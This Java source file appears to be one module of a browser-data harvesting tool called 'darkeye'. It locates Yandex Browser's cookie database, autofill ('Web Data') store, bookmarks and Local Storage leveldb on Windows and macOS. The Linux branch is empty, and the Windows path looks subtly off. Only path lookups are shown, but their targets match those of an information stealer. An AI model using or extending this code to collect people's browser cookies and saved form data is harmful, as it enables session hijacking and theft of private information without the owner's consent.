package org.spray.darkeye.module.browsers;

import org.spray.darkeye.module.BrowserModule;
import org.spray.darkeye.utils.OSTools;

public class YandexBrowser extends BrowserModule {

	public YandexBrowser() {
		super("Yandex");
	}

	@Override
	public String getCookie() {
		return getFolder() + "/Cookies";
	}

	@Override
	public String getAutoFill() {
		String data = OSTools.isOSLinux() ? "Web\\ Data" : "Web Data";
		return getFolder() + "/" + data;
	}

	@Override
	public String getBookmarks() {
		return getFolder() + "/Bookmarks";
	}

	@Override
	public String getLevelDB() {
		return getFolder() + "/Local Storage/leveldb";
	}

	private String getFolder() {
		String folder = "";
		switch (OSTools.getType()) {
		case Windows:
			folder = System.getenv("APPDATA") + "/Local/Yandex/YandexBrowser/User Data/Default";
			break;
		case MacOS:
			folder = "/Library/Application Support/Yandex/YandexBrowser/Default";
			break;
		case Linux:
			break;
		default:
			break;
		}
		return folder;
	}
}
